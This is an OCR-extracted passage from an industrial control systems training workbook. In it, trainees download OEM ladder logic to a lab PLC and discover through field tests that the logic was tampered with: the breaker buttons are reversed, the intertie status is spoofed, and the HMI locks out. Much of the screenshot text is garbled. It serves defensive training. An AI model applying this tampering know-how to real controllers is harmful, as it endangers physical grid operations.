| ©) Full Screen Fil |30 TCP 60 44818 -- 1746 [ACK] Seq=384617 Ack=284279 '
¥) Packet List \10 TcP 54 1746 ~ 44818 [ACK] Seq=284279 Ack=384618 '
. : ~ 4 30 TCP 60 44818 - 1746 [ACK] Seq=384617 Ack=264279 |
(¥| Packet Details 16 TCP. 54.1746 44818. [ACK] Seq=284279 Ack=384618
lv Packet Bytes
Ey-y Ten. BO AAQAD 4746 PACU Coa =20 4612. Aol —2042990.!
Time Display Format Date and Time of Day (1970-01-01 01:02:03.123456) ctri+aAlt+1
Name Resolution » i Year, Day of Year, and Time of Day (1970/001 01:02:03.123456)
Zoom » | Time of Day (01:02:03.123456) Ctrl+Alt+2
.| Expand Subtrees Shift+Right | Seconds Since 1970-01-01 ctrl+Alt+3
4 Collanse Suhtrees ShiFrat eft | ® Seconds Since Beginning of Capture Ctrl+Alt+4

. 2020-07-16 23:31:27.514751 19.10.10.30

. 2020-07-16 23:31:29.568382 10.10.20.10

© 2021, Robert M. Lee Lab 3.3 -8

aay @,

a, a, @) aw, a, ey) @)

@)

= Ss 3 Bh 8 eee od eee eed
mT rT a mT a cw oT _w

1s

ce

se ap

4B

“ap “5 “5 ty

*Note* This shows that the time is roughly 2020-07-16 23:31:29 UTC when the retransmissions started
happening consistently.

*Note* It is a bit difficult to identify for sure but what appears to be happening is that the PLC has crashed. As
you scroll through the retransmissions we can see that the PLC is actually still on the network and has TCP
communications with 10.10.10.30 but the actual CIP communications are no longer working.

16.10.20.10 10.10.10.30 TCP

10.10.10.30 10.10.20.10 TCP

10.10.20.10 10.10.10.30 TCP

*Note* What likely has happened (and could be confirmed locally at the site) is that the PLC itself crashed but
the network interface card on the PLC is still online. This speaks to the logic on the controller itself being
corrupted which makes sense in context of what we know. What we do not know though is whether or not
the adversary intended to crash the controller. There are generally easier ways to crash a controller than
manipulating the logic. . °

*Answer* 2020-07-16 23:31:29 and likely PLC crash but network card remained online

© 2021, Robert M. Lee Lab 3.3 -9
i, Ces CO! CO! CO Co Oh Ld

owes we ws w& Ww wb we wo w

Vv vw vw

Objectives

e Download PLC with a new ladder logic file without stopping the process
e Investigate via network monitoring tools that PLC has been downloaded
e —_ Test the new PLC logic functionality

e Find clues to determine what’s different

*Scenario Information* The Combustion Turbine (CT) OEM has requested the PLC control system be updated.
Specifically, the OEM has made modifications to the CT Fuel Valve controls capabilities, after their testing they
have sent you, the engineer, a revised PLC ladder logic file to download.

The OEM has indicated that ladder logic file can be downloaded as a “Run Time Edit”. You know as an
engineer that a “Run Time Edit” allows the PLC to continue to operate during the PLC download so the
download will not affect the rest of the system. In the past, you have downloaded PLC code by stopping the
PLC from running the code, you downloaded the code and started the PLC running again by placing it into Run
mode. In this specific lab scenario, you want to download new Generation code without stopping the
Transmission and Distribution. By performing a “Rur: Time Edit”, each system should continue to operate
without effect.

After the engineer role downloads the new OEM PLC code, the engineer will verify the HMI operation and they
will work with a field technician to verify the field operations.

This lab will utilize the SANS ICS Windows VM and the PLC Kit

Task — Download the OEM Vendor Change Ladder Logic to the PLC

You have downloaded PLC Ladder Logic before, but this time you will perform a “Run Time Edit” so the state of
the Transmission and Distribution systems will be unaffected.

> Load the operational logic file into the PLC
> Open the Windows VM
> Locate the file in the ics515 folder — “ICS515 OEM Change V2.ckp”
> Double click the file to launch the CLICK programming software with the project

© 2021, Robert M. Lee Lab 3.4-1
CLICK Programming Software (Version 3.01) - ICS515¥10 OEM Change for Production Boards.ckp - [Main Program]
Fie "Homes tlt View Setup Progtam instruction PLE window

leedhcnd - = ag Cursor | Rung Comments
©) Address Comments cou
“Nicknames sires

Turearnee Somme
PyWrte Project 81K Houle,
‘Connect £3 pucinformation | £°) PLC Evo

© Cross Reference
eet

Unde | Rede

ax

aye 3 r eas

Ca NT ar

Program Function PLC Taso
Ladder Program rs | Bsc

eee

all.
Initiate | |Ea6} Contact (NO)

123 Main Program Az 1
dl Subroutine Pregram -
i WA BrestetModele

|B Contact (NC)
Cal “i Edge Contact

‘et Distind Alarms 2
* DistindStates
istindustriat |

Genstates ipa Compare

‘| = DictResAlsrm= |
124 DistRendental
$4 DistResstates

eee = Genention

Catt

AI Gen _Fuel_Controt 1+]
M4 GenAlarms
1 |B Generation

> Gen Fuel_Conticl

A enalarms

Ed Genstetes
| hs Initiate
| By RemoteCommwD

cal
M, reanStates

» A TeansAlams
SEX Tranemission
|| bh Transtater >

Call

1B Interrupt Program lee
© Address Picker
| F Edit Rung Comments A

Transmission

Call,

Sy Local Program informatic! | |_—_
& Syntax Check |
Cross Reference View 6

TancAlarms

Call

89 Monitor i |
JB status Monitor
Data View Se

> DietResStates

52, pistResiential

~ HR peteview! sonore
FS Text View

Call

ER Marries View |
2 Override View Oe coe

(Bet ieteger al integere2 words)

[Bl Ficating pomt BlHex (Det

DistResAlarms

c-o1cPu. ee) : *

{Al Ascii — 9000/8000

> When the application opens, find in the top menu the icon with the Red Down arrow that is used to

Write a project into a PLC

Window — Help

(El Style + -
ta) <> Offline FP status
mile Fs PLC Mode... [Data View

> Aconnection screen will appear, you may need to select Ethernet in the Port Type drop down and
you may need to select the adapter under the Network Adapter drop down. If you do not see the

adapter in the drop down, then you will need to reassociate the USB to Ethernet adapter to the host

again and relaunch the connection attempt. You should see a PLC that has been discovered.

[connect to CLICK PLC x
Ths Computer
Direct connecton
pettwe: aes Location of the target CLICK PLC
Netecck Adapters sea aay Sean RE ROL
Intel(R) 82574. Gigabit Network Connecton. outside this LAN (Vou need to allocate IP address and port number manually.)
Pat othe [ picieme Paden | Srboettiack |Parttember | Frowere |jode Senn | Macaddess
B Address: 192 168.0.8
Subnet Mask: 255,255,255.0
Defadt Gateway: 0.0.0.0 |
|
Refresh SKRUN BERR LEDs Edt.
[comet] cone He
© 2021, Robert M. Lee Lab 3.4-2

Ce, @,

(2
we we WB wo we oe Oy wy we

Click the Connect button
Enter the “sansics123” password

VVV

program is being replaced with the new program.

Write Project into PLC

°C
Program Size (Total: 8,000 steps)
@iProgram Size: 1,254 steps (15.67 %)
irre Area: 6,746 steps (84.33 %)

Min F)

° 8,000 |

Project File (Total: 262, 144 bytes)

WiiProject Fle Size 41,216 bytes (15.72 %)
GiFree Area: 220,928 bytes ( 84.28 %)
0 262,144
Last Update: Ju 29,2021, 21:21:17
Wivarite Project File into PLC

By enabling this option, the project file will be
downloaded(Write) into the PLC. If you want to disable
project upload(Read), disable this option.

Program Size: 1,220 steps (15.25 %)
WiFree Area: 6,780 steps (84.75 %)
C) 8,000

‘Project Fie (Total: 262, 144 bytes)

iProject Fle Size 40,624 bytes (15.49 %)

Wire Area: 221,520 bytes ( 84.51 %)

° 262, 144
Last Update: 3 29,2021, 20:41:15

By enabling this option, program wil be downloaded nto
the PLC without switching the PLC mode to the STOP
mode.

mE ea ae

> — Confirm that you want to Proceed RUN time edit

RUN Time Edit Confirmation

When prompted select “Run Time Edit” so the PLC program will continue to operate as the old

se

You are going to execute a RUN time edit. If you prefer to put the PLC in
the STOP mode when you download the project, dick the Cancel button
and uncheck the RUN Time Edit option in the Write Project into PLC window.

Don't display this message again until starting up the software next time.

> Select Proceed RUN time edit to download the Click PLC

Ss ww

as’

© 2021, Robert M. Lee

Lab 3.4-3
Project Discrepancy

before executing the new project.
PC —_—_____ _
Project Name: [ICS515 OGM Change v2

Program Size (Total: $,000 steps)

GiProgram Size: 1,254 steps ( 15.67 %)
WiFree Area: 6,746 steps (84.33 %)
° 8,000

Project File (Total: 262, 144 bytes)
WBProject File Size 41,226 bytes (15.72 %)

WiFree Area: 220,918 bytes ( 84.28 %) |
° 282,144
Last Update: Ad 29,2021, 20:24:54
Stop the PLC and download project

‘You are going to download a different project into the CLICK PLC thats in the RUN mode currently.
In this case, you may want to download the project in the STOP mode, so the CLICK PLC will initialize the memory

PLC
Project Name: [ICS515 Site Acceptence Test Vi__|

Program Size (Total: 8,000 steps)

BBProgram Size: 1,220 steps (15.25 %)
WiFree Area: 6,780 steps (84.75 %)
0 8,000

Project File (Total: 262,144 bytes)
MiProject File Sze 40,614 bytes (15.49 %)

Free Area: 221,530 bytes ( 84,51 %)
° 262,144
Last Update: 2d 29,2021, 12:34:12

> Verify the new OEM PLC Code has been downloaded
> Verify the window header says “ICS515 OEM Change V2.ckp”

Breakerodee 7% erate HN Cesare ely Tiras

$f Dieting FesnotahittBalay
Es Disindsiates am

reat F9 HE

Sed Dintrat }

Rema HY Centre Dey Tamar

ny
ar

eh Transeo
BW hrcenrupt Pregeam

@ hasdvess Picker
of Fe Rung Comments
1} Leeal Program Infor
1 Synten Check

© Cros Rater View
2 Monier
BF satus Monster | C5518 OFM Change V2 - 0 error(s), C warnings}
HE 0st view “mm
TB Detavewt Write Project ite PLC.
5 ot Yew + [tance complete

Genezation nterie On:
‘0:Gen interie

Bek Dloese  Bisteeitvorts Blrowing poe ie Mien ci mun

ieee ene. a,

> If your FTVlew HMI is not running, Locate the “Run HMI” shortcut on the Windows VM desktop

> Click Yes on the prompt and wait — good things are happening it may take 10 seconds be patient

© 2021, Robert M. Lee

Lab 3.4-4

a iN iN

a,

@

)
ew we

ve we oe we we

we we ww

ww

Replace Local System Directory

The Application’s FactoryTalk System Directory for users and policies
will be loaded on this Terminal. The existing FactoryTalk System
Directory will be archived and will automatically be restored after the
runtime application is closed.

Please close all other programs that are currently accessing the Local
FactoryTalk directory. Select YES to continue or select NO to cancel

the loading of this Application.
Yes No
F7 [Fa]

UnpackMER.dil in FactoryTalk Linx

Verified publisher: Rockwell Automation
File origin: Hard drive on this computer

Show more details

> Select the “Run Application” button

FactoryTalk View ME Station - 10.00.00.290(Patch 03)

[ iessieva mer

|

| Load Application Run Application Application Settings
i Fl IF2] iF3]

‘

Delete Log Files

Terminal Settings Before Running
IFS)

[Fa]

© 2021, Robert M. Lee

Lab 3.4-5
> Once the HMI Loads, you will see the Main screen. Depending on how you have left the system, you

will see the status of the breakers, the Residential and Industrial area loads.

BE Power System HMI - Main [2 Hour Limit]

Generation

|

T n ‘Transmission,
a Intertie LEH
1
MW Output Switchyard : Breaker Protection Relay
Open Close 1 Open Close | Fault Reset

Neeev, 1 NU“e Nat 2
|

7 \ | | 7 _~* fN
1

Min <> Max
Ey
wn
} ABR Power Meter (96)
© 2021 SANS 1 9
Made in the USA
Indust

N\ /
Reclosure
Open Close
4 \
\ /
Load
~~| Min <> Max
7 N
{OP AS

Distribution

Alarm time
‘pei2021 35542 PH
79912021 3:49:27 PUL
79/2021 3:48:27 PH
yysa021 3.4438 Pu
77872021 2:10:48 Pid
79012021 2:10:48 PH
7eie02 188.32 PM

‘Acknowledge ime

Message
Fuel Valve Critical Alarm
Gene(alion ares Critical alarm

Local Generator Nott Min For Breaker Closea

We will now ensure the Transmission, Residential and Industrial Distribution Areas are up and running

before we conduct the Generation Area tests

Close Industrial Breaker

Verify Sim Switch 8 — Expert Mode On is turned to the “On” position

> Navigate to the Industrial Screen and close the Industrial Breaker
> For this step, leave both refineries off

Residential

Max |

Industrial

Trends

7/90/2024
$4802 PM

uw Refinery B
% on

ae
al on |

© 2021, Robert M. Lee

Lab 3.4-6

a, a, (?, ce, ae,

qe)
ve

~_ w ws

oe ws «a «5 “a

> Close Residential Reclosure

> Navigate to the Residential Screen

> Close Reclosure

Generation

‘Alarm time ‘Acenowiedge ime
77972021 10:50:13 Pit

‘Transmision
& Distribution

Residential Industrial

Lake House Drive

Lake Pleasant Road

Lake Trout Way

Message

vate Cr
Generation Area Critical Alarm
Local Generator NotAt Min Far Breaker Closed

Trends

Login

~ Current Load

Max Load

71912024
10:56:32 PM.

0 nw

400 | MW.

Generation

Tr
& Distribution

ision

Residential Industrial

Lake House Drive

Lake Pleasant Road

AR,

Lake Trout Way

Chse

~~ Current Load

Max Load

71812024
58 PM

Ea

400 | MW

Alarm time Acknowledge time
7/9/2024 0:50.13 PA

Message
Residential Aree Crtical Alarm

Local Generator Natt Min For Breaker Closed
‘Transmission Area Crtical Alarm
‘Generation ares Critical arm

j
ee |

© 2021, Robert M. Lee

> Close Transmission Lamda Breaker and Reset Lambda Transmission Protection Relay

Lab 3.4-7
> Navigate to the Transmission & Distribution Screen
> Close the Lambda Transmission Breaker
> Reset The Lambda Transmission Protection Relay

BE Power System HMI - Trans_Dist [2 Hour Limit} “i

Main Generation idential Industrial Alarms Trends
Transmission & Distribution
Generation
280 MW -— i

arr |
(eo) |) Lamda
| Power House

TRANSFER BUS

Lambda | ‘Open
Transmission

Protection -
Ser” (o) =] |

MW Consumption
0 %

Arai ime Aemowledgetime _ Wessage
0:

7912021 3:55:42 PM
7902024 3:49:27 PM

71912021 2:10:48 PUL

> Reset any alarms by physically pressing the “Reset Alarm” pushbutton on the C3PO board

BB Power System HMI Trans_Dist [2 Hour Limit] = x

7igi2021
Generation Residential Industrial 11:08:33 PM

TRANSFER BUS

Lamda

Reclosure

—|—_

‘Alaim time ‘Acknowledge ime Message

? 77072024 es 43Pu Residential Area Ctical Alarm
77912024 3:55:42 PL Fuel valve Critcal Alarm
790/202 3:49:27 PM ‘Generation Area Critical Alarm
792021 249.27 PM Local Generator NotAt Min For Breaker Closed a
79/2021 3:48:38 PM ‘Transmission Area Critical Alarm
7792021 2:10:48 PM Generation Area Critical Alarm
© 2021, Robert M. Lee Lab 3.4-8

RD BD BO BO PB

> > ®

eo ee @

eo

e,
ip 7 ou

ww

Bs 4s ae as 45 ae ns a5 is’

as

> You should see the Grid Board indicating that some or all of the Residential houses LEDs are lit.
If you do not, turn the knob on the Residential Potentiometer fully clockwise (maximum) so all
the house LED’s are lit

> You should see the Grid Board indicating some value for the Industrial Distribution area. If the
meter is reading zero, turn the Industrial Potentiometer fully clockwise (maximum) so the
Industrial Meter reads about 20 MW

> Verify Generation operation though the FTView HMI
> Navigate to the Generation screen

BB Power System HMI - Generation [2 Hour Limit] - x
e Transmision 2024
Main Generation & Distribution Residential Industrial Alarms: Trends Login 14:13:06 PM EXIT
CT Fuel Valve Controls Generation Interlock Status
© Manual Mode Open |
© Automatic Mode Fsitt4) Breaker Permissives |
@ Local Click PLC e O Generator Runnirg {
0 % Open © OpenPLe BP OS @ Trans Breaker Cosed
ineulee Meruel i ° @ Trans. Protection Relay
OpenPLC @ Load Present
Control
Inlet Air Steam Turbine
|
°
A Output
Combustion Turbine ] tp
0 |Mw
OCT Running O AVR On Power Power Power
ExpertMode © CT Stopped @ Manual Mode On Consumption Generation Available
Sim 8 "
on=Use pas Star =| Voltage Manual Industria! 59 | MW Local 0 MW Local 0 mw
= . ames Mode
Of = Auto Start = =z Regulation : Setpoint Residential 99.) MW intertie 158 MW Intertie 500 mw
oH EaSeee] BAAR: 280 | Mw Total mw Total [158] mw Total [500] MW
Alarm time Acknowledge time Message
7912021 105013 Pia Residential Area Critical Alarm
7#912021 10:41.23 PM Transmission Area Cntcai Alarm
77912021 3:55.42 PH Fuel Valve Critical Alarm
78912021 3:49:27 Pd Generation Area Critical Alarm: |
71912021 3.49:27 PU Local Generator Not l Min For Breaker Closed
7192021 3:44:28 PM Transmission ares: Alarm
71972021 2:10:48 PUL Generation Area Critical Alarm

> Set the Combustion Turbine Voltage Regulation Mode to AVR and the CT Fuel Valve Controls to
Local PLC and Automatic Mode

© 2021, Robert M. Lee Lab 3.4-9
BE Power System HMI - Generation [2 Hour Limit] = x
Main Generation | ,ransmision | Recidential Industrial Alarms Trends EXIT
Generation Interlock Status
Dive | | Gee @ inertie On |
pasate: oe SES Breaker Permissives |
O Generator Running |
| ev eiece? @ Trans Breaker Closed |
| re Trans. Protection Relay |
eee +4 i
. ' ; { @ Losd Present
OpenPic lode Mode 1
| |
| |
Inlet Air i Steam Turbine |
“120 |deg F
0 |uw'
OCT Running Power Power Power
Expert Mode @ CT Stopped Consumption Generation Available
‘Start | Industrial 59 «NW Local Q Mw Local | | Mw
. Residential 99 | MW intertie [__ 188 | MW Intertie | 500 | MW
nase | Pais aise MWI Total uw Total [ 158 | mw =Total | 500 | MW
Alarm ime ‘Acknowledge time essage
79/2021 10:50:13 PM Resicential Area Critical Alarm
7/8/2021 1061.23 PH ‘ransmission Area Critical Alar
719i2021 25642 Pua Fuel valve Critical Alarm
749/202 3:49:27 PM Ganerstion Area Cotticat Harm
79/2021 348.27 PU Local Generator Nott lin For Bresker Closed
7/9/2021 3.44:38 PIA Transmission 4rea Critical Alarm
71972021 2:10:48 PA Generation rea Critical Alarm

> Start the Combustion Turbine by pressing the “Start” pushbutton and you will see the “CT
Running “Indicator and the Generator Output MW will ramp up to 1MW.

2a f& & w&S

eo ®*® & B&B

* Note: The generator must be running at the Minimum Switchyard Close Breaker value before the
Switchyard breaker is allowed to close. In this lab system, the Minimum Switchyard Close Breaker
value is IMW.

BB Power System HMI - Generation [2 Hour Limit} = x

e® @®

Generation

Transmis
& Distribution

CT Fuel Valve Controls

hl

OvénPte | manst | [ 00

O Manual Mode
© Automatic Mode

% Open

Inlet Air

Generation

Trends

@ Local Click PLC © Generator Running
Ct] % Open © OpenPLe @ Trans. Breaker Closed
icin iw H Trans Protectin Relay
‘OpenPLC Mode Mode oad Present
Control Control Setpoint

Steam Turbine

Interlock Status

@ intertie Oo
Breaker Permissives

Combustion Turbine
Lecennle AVR On Power Power Power |
Expert Mode lopped C) Manual Mode On Consumption Generation Available
/oltage pri Industrial 5a | MW Local 1 MW Local 0 mw
lode seeeeiareen are ———
Setpoint: Residential 99 | MW intertie |__ 158 Mw Intertie [500 wwf
= Mw Total uw Total 159 mw = Total | 500 mw
Am ime Message
p «7972021105013 PM |Area Crittcal Alarm
19/2024 10.41.23 Pd Transmission rea Critical Alarm
792021 3:55:42 Pla Fuel Valve Critical Nar
71912021 3:49:27 Pla Generation Area Critical Alarm
77912021 3:49:27 PH Local Generater Nott in For Grezker Closed
79120213 44:38 PM ‘Transmission Area Critical Alarm
7/8/2021 2:10:4B PM Generation Area Critical Alarm:

© 2021, Robert M. Lee

Lab 3.4-10

)

)

)

)

"7 7T7TODOD®
ew ww

a ww

ws ww w se w

ip

TY

> Close the Switchyard Breaker by pressing the “Close” pushbutto

> You should see the MW output increase to meet the demand from the Residential and

Industrial loads

n

BE Power System HII - Generation [2 Hour Lit]

Transmision

Generation |" Distribution

Residential Industrial

CT Fuel Valve Controls Generation

= © Manual Mode . |
5 J @ Automatic Mode Eager)

@ Local Click PLC
36 | % Open O OpenPic
Local or Manual
‘OpenPLC Levan Mode

Control

Login

71812024

11:26:30 PM

Interlock Status

Steam Turbine

@ imertie On

Breaker Permissives
erator Running

rons. Breaker Closed
@ Trans. Protection Relay
@ Load Present

1
|
|
|
|

Output |
Combustion Turbine q |
“ 154 | MW a |
@ CT Running @ AVR On Power Power Power |
Expert Mode — © CT Stopped © Manual Mode On Consumption Generation Available |
On Use PBs “Start | _Votage pd Industrial 59 | MW Local 158 MW Local 280 mw |
= Auto Stat aes Regulation 0
Off = Auto Start : sue Setpoint Residential 99) «MW intertie 4 MW Intertie 500 Mw
On Ml | 280 | Mw Total uw Total [162 | mw Total [780] MW

Alarm time Acknowledge time Message

7/9/2021 10:50:13 Pla Residential Area Critical Alarm

7/8/2021 10:41:23 PM Transnussion Area Critical Alarm

72021 3:55:42 Pi Fug! Valve Criticat Alarm 1 J

7/9/2021 3:40.27 PM Generabon Ares Critical Alarm

792021 3:49:27 PM Local Generator Nott Min For Breaker Closed

7192021 3:44:38 Pld Transmission Area Critical Alarm:

7102021 210 48 PU Generation Ares CeficalAiarm

> Open and Close the Switchyard Breaker to verify the PLC program change supports proper

breaker operation.

> Place the CT Fuel Valve Manual Mode Setpoint to 100% and place the Fuel Valve Mode Control

to Manual Mode. Verify the fuel valve % Open ramps to 100%

© 2021, Robert M. Lee

Lab 3.4-11
BB Powers System HMI - Generation (2 Hour Limit]

Transmision

& Distribution _ Residential

Generation

CT Fuel Valve Controls

@ Manual Mode

1
© Automatic Mode mater ae}

Open

Industrial

Generation

Alarms

@ Local Click PLE
© GpenPLe

Mode

re

eras

or

Control

inlet Air

Alsim time. ‘Acknowledge time essage

7/9/2021 10:50,13 Pia Residential rea Critical Alarm

71812021 10:44:23 PM ‘Transmission Area Critical arm

7192021 3:55.42 Pit Fuel Valve Critical Alarm

77912024 3:49.27 PHA Generation Area Critical arm

79912024 3:49:27 Pld Locel Generator Nott lin Far Breaker Slosed
7792021 3.4438 PM ‘Transmission rea Critical Alarm

79012021 210.48 PL Generation Area Critical arm

Trends

Steam Turbine

71912024
ee 11:31:24 PM

Interlock Status

@ intentie On.

Breaker Permissives
@ Generator Running

@ Trans. Breaker Closed
@ Trens. Protection Relay
@ Load Present

Combustion Turbine g a
158 | Mw.
@CTRunning @AVROn Power Power Power
Expert Mode OCT Stopped ©)Manual Mate On Consumption Generation Available

on=useras fl San) _vottage Manual Industrial 5a | MW Local 168] MW Local [280 | mw

Off = Auto Start = Regulation Mode L ne
, Setpoint Residential 99 MW intertie ) Mw 500 Mw
_ 200) MW Total uw Total [168] ww =Total [ 7e0 | MW

> Place the CT Fuel Valve Mode Control back to Automatic Mode and verify the fuel valve %

moves to a lower value than 100%
>

“~

*Note* When the fuel valve is place in Automatic Mode, the fuel valve open % is calculated to meet the load
changes. When the fuel valve is in Manual Mode, the fuel valve open % is set to the manual mode setpoint.
Also note, if the manual fuel valve open % is too low to support the load, the CT Generator MW output will be
limited by the fuel valve open %.

> The OEM has changed the fuel valve operation from a linear relationship as seen in the graph
on the left to a more aggressive linear relationship as seen in the graph on the right. We want

@

to test the new fuel valve calculation to ensure the fuel valve code is working properly.

100 100
% Fuel % Fuel
Valve Valve
Open Open
0 0

0 MW

280

0

MW

280

> To doa quick check, we will use the following formula to validate the fuel valve change.
(Output MW + Max Generator MW) x 110 = % Fuel Valve Output

© 2021, Robert M. Lee

Lab 3.4-12

oe @ @ oe fe

hel

(B)
wwe wo» Wb wb dbo WY wv wb

Vv Ww WwW FT Ww WwW Ww W

uo w Ww

*Note* In our example we have ( 154 MW Output + 280 MW Max Generator MW) x 110 = 60% Fuel Valve
Output

> Using the Generation screen, verify your % Fuel Valve Output calculations are correct and the
OEM has indeed made the correct code modifications.

> We have loaded a PLC program without stopping the PLC code execution engine

> We have setup our Grid Board to have the Transmission Breaker closed and the Transmission
Protection Relay Reset

> We have added Residential and Industrial loads

> We have checked the operation of the local generation resources through the HMI and verified
the fuel valve control automatically adjusts to generation demand changes in response to load
changes

© 2021, Robert M. Lee Lab 3.4 -13
vo vw YY Yess wu www w

_ Lab 3.5 — Field Point Verification _

e __ Investigate via network monitoring tools that PLC has been downloaded
e Test the new PLC logic functionality
e Finding clues to determine what’s different

*Scenario Information* After the logic changes that have been made with the OEMs information we need to
go through and validate the logic and ensure no abnormal activities occur in our environment.

This is a continuation of Lab 3.4 and will utilize the Windows VM and PLC Kit

1. How would we know if the Switchyard breaker is closed? Do we trust the LED’s or the HMI status?

2. Is it possible for the HMI to be controlled remotely?

3. Is it possible for the PLC code to change the HMI screens?

© 2021, Robert M. Lee Lab 3.5-1
Working with the Field Engineering staff, you operate the physical pushbuttons and observe the LED indicators
to check for proper field operation.

1.

2.

Test Switchyard Breaker Close PB

> Push Switchyard Breaker Close PB (this test should verify that the Close operation keeps the

breaker in the closed state and should not impact generation in any way)

Be Power Sect Hiat- Generation {2 Hout Lim)

Transmizion

& Distribution | Residentiat

CT Fuel Valve Controls

@ Local Chex PLE

toa % Open O Opens
‘
Control ‘Canto! Setpoint

Warsail| [00] «open

© Mana ode
i 2 © Artoratic Hoe Leow

Industrial

Generation

79/2024

ea 41:50:11 PM

Interlock Status

@ irtere 09
Breaker Permissives:

@ Lood Present

‘Steam Turbine

: / Output
‘Combustion Turbine @ aw |
@crRining Ave oe Power Power Power
Expert Made ©) CT Stopped O)Manual Mode On Consumption Generation Available
‘Sim 8
on=Users's | Sak | Ba weal indusinat [80] MW toc [+] MW Loca [0
Of = fate Sart: ey —_Selpownt Residentiad [€0] MW nierie [158] MW Inerio
ae power | | ww Total mw Total [168 | uy Total
Tnomicyeire —_Tasnase
JAgnas fose-s3pa cra sa
imate} e129 Pu “rananareen tee Cris
mats} 25640 Ht Ecorse ea sam
Yaanes 34827 Fl ‘Saneaon na Cra lar
Yaya 32037 Pu CSS Steerat ita an: Gear ieree
‘zie 34838 Teanamesin sea
rarer Semen ea Sa

> Observe what happened

Test Switchyard Breaker Open PB
> Push Switchyard Breaker Open PB

[Power Sytem bt - Generation 2 Hew Lene]

sion

stor! | Residential

| CT Fuel Valve Controls
| © Manual Mee 1
TS cx] =
| © Local Chek PLC F

[460] Open pene

Local ar Marval

Cpenpic ote, ge

Controt Control Setpoint

Intet Air

| ES

120 |deg F
J ——
K
Combustion Turbine
@crasning DAM On
Expert Mode == ©) CT Stopped © Manual Made On
sant BM ctoge = Marat
Bi 2. ==) Regulation Mode
: Seloort
Sop Marah 70] mw]

Interlock Status

@ inverse On

‘Breaker Permissives

© Generater Ruoneg

@ Trans Breaker Crsee

@ Trans, Protectan Relay
@ Load Present

‘Steam Turbine

183 Jaw
Power Power Power
Consumption Generation Available
industiat [58] MW Local [160] MW Local [280] uw
Residewial [09 | MW mete [0 | MW bnterie [S09 | Mw
Totat www Total [188] ww Total (709)

5
R202) 2 40 Pu

> Observe what happened

© 2021, Robert M. Lee

Lab 3.5-2

(®) (es) (®) (*) (®) (2)

aay

> ® ® ®

®)
ww wo WO WO WO ODDO DDO OD Dw

oe ww ww Ww WwW

ip’

> It appears the Switchyard Breaker Open Pushbutton closes the Switchyard Breaker
> It appears the Switchyard Breaker Close Pushbutton opens the Switchyard Breaker
> It appears the Switchyard Breaker Close and Open LED matches the HMI Status

Task — Test Intertie

The validation of switchyard breaker operation, caused the generation unit to trip offline due to an error in
the field manual control operations being reversed. Residential and Industrial load remained in tact due to the
interite connection to the larger electric system. The connection to the Intertie is very critical for the local
generation operations and as long as the intertie is On and connected, the local generation resources aren’t
worried if the load from the Residential or the Industrial Distribution areas go to zero because the local
generation resources can provide power through the Intertie. If the Intertie is Off, then we have to monitor if
the Residential or the Industrial Distribution areas go to zero so we can trip the Switchyard breaker and idle
the local generator. We should test to see if the Intertie status is working properly.

1. Test Intertie connectivity status
> Navigate to the Generation screen and turn the Combustion Turbine On and Close the
Switchyard Breaker
> Turn Sim Switch 3 - Intertie to Off
> Navigate to the Transmission & Distribution screen
> Click the “Intertie Generation” area to turn the Intertie connection off.

7/40/2021

Generation Residential Industrial Trends 421742 AM

Transmission & Distribution

Brier
Lamda
Lamda Substation
Power House
TRANSFER BUS

Lamda
Lambda Open ‘cose | Transmission
‘Transmission L. Breaker
Protection e
Rey at) Fault | [ese ;
4B a ne

. =. & BP
wb = - + s ve | @ |

MW Consumption
a) MW

Alarm time Acknowledge time: Message
71912021 10:50:13 Pld Residenval 4vea Critical Alarm
77912021 10:41:23 Pa Transmission Ares Critical Aiarm
7192021 3:59:42 Pla Fuel Valve Critical Alar:
71912021 3:49:27 Pl Generation Area Cittical Alarm
7/9/2021 3.49.27 PH Local Generator Not At fin For Greaker Closed:
7/9/2021 3:44:38 PA ‘Transmission Area Critical Alarm
79912021 2:10:48 PM Generation Area Critical Alarm
© 2021, Robert M. Lee Lab 3.5-3
Generation Residential industrial

Generation
280 MW

Substation

|
|
SL tunis |
|

TRANSFER BUS

Transmission & Distribution =) -- —————

Lamda

J Breaker

Lambda Open
Transmission
Protection
Relay @) Fault
. Ny

Reclosure

7/10/2024
12:20:53 AM

MW Consumption
191%

=

Alarm time Acknowledge time Message
792021 105013 Pet Residential Area Criteat arm

7912021 10:41:23 Pld ‘Transmission Area Critica Alarm

7797202135642 PLL Fuel valve Critical Alarm

71902021 2:49:27 18 Generation érea Catical

7912021 3:49:27 PM Local Generator Nott iin For Breaker Closed

77072021 3:44:38 PM ‘Transmission Area Caical Alarm

71992021 2:10:48 PA Generation Area Caticai Alarm

> Does the HMI match the Intertie Physical LED?
> Turn Sim Switch 3 —Intertie On
i. Does the HMI status Change?
ii. Does the physical Intertie LED status change?

> It appears the Intertie HMI Status and the physical Intertie LED do not match status

> It appears turning the Sim Switch 3 — Intertie switch to On does not affect the Intertie status
> It appears the OEM PLC code has been altered in a possibly malicious way to cause a reverse

operation of the physical Switchyard Pushbuttons

> It appears the OEM PLC code has been altered in a malicious way to spoof the status of the

Intertie which could lead to mis-operating the local generation resources when the Intertie is

not available.

© 2021, Robert M. Lee

Lab 3.5-4

@

=
ay vw +

/- wo a

Task — Continued System Testing

Our system has been programmed for summer and winter considerations. We can use Sim Switch 2 to
simulate these modes where turning Sim Switch 2 On will allow us to put the system into Winter Mode. As we
start to load up the system, we can see the effect of Winter mode.

> Turn Winter Mode On
> Turn Sim Switch 2 — Winter Mode On

> Turn Intertie Simulation Switch On
> Turn Sim Switch 3 —Intertie Mode On

> Load the Industrial Zone by turning on the Refineries
> Navigate to the Industrial screen and turn refineryA and B On

Main

‘Transmission

Generation & Distribution Residential TEESE.

7130/2021

7:46:24 PM. EXIT

Alarms Trends Login

\
o/

MW Consumption

MW Draw 299

Current Output 99

Per T T

Refinery B
On

Off

> Navigate to the Generation Screen

>
>
>
>
>

© 2021, Robert M. Lee

Verify the CT Fuel Controls are in Local Click PLC Mode

Verify the CT is Running and AVR Mode is On

Note the Power Consumption of the Industrial MW is greater than 200 MW
Note the Power Consumption of the Residential MW is greater than 80 MW
Note the Power Generation of the Local MW is greater than 200 MW

Whamo — What happened! The HMI screen changed to the Main Screen and you are now
locked out from changing screens! Also, did you notice the local Switchyard Breaker is
displaying an open status in the HMI!

Lab 3.5-5
BB Power System HMI - Main (2 Hour Limit}

Generation

_Generation

Residential Industrial

Trends

Intertie

Login

‘Transmission

7/10/2024

1:08:28 AM EXT

itchyard Configuration
MW Output esate Breaker Protection Relay =
n Close Open Close | Fault Reset |
